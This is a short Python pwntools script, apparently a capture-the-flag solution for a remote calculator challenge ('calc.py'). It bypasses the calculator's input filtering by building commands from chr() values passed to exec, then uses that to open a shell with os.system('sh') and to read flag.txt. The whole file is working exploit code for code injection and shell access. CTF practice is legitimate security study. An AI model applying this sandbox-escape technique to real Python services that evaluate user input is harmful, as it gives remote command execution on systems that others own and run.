#!/usr/bin/env python3

from pwn import *

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 19815)
    else:
        p = process(['python3', 'calc.py'])
    return p

def run_remotely(cmd):
    payload = '+'.join('chr({})'.format(x) for x in cmd)
    payload = 'a = exec({})'.format(payload)
    p = conn()
    p.recvuntil(b'Have fun!')
    p.sendlineafter(b'$ ', payload.encode())
    p.interactive()
    
print(run_remotely(b'import os; os.system("sh")'))
print(run_remotely(b'import os; os.system("cat flag.txt")'))

